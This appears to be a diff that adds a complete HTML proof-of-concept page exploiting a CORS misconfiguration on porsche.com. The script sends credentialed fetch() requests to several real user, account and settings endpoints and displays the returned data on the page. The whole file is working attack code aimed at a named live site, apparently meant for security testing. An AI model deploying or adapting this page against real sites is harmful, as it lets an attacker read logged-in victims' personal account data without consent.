@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Exploit PoC</title>
+</head>
+<body>
+  <h1>Testing CORS Misconfig</h1>
+  <script>
+    const endpoints = [
+      "https://www.porsche.com/api/user",
+      "https://www.porsche.com/account/details",
+      "https://www.porsche.com/settings",
+      // Add all 22 endpoints here
+    ];
+
+    endpoints.forEach(url => {
+      fetch(url, {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(response => response.text())
+      .then(data => {
+        console.log(`Response from ${url}:`, data);
+        const div = document.createElement("div");
+        div.innerText = `✅ ${url}: ${data.slice(0, 200)}...`;
+        document.body.appendChild(div);
+      })
+      .catch(err => {
+        const div = document.createElement("div");
+        div.innerText = `❌ ${url}: ${err}`;
+        document.body.appendChild(div);
+      });
+    });
+  </script>
+</body>
+</html>
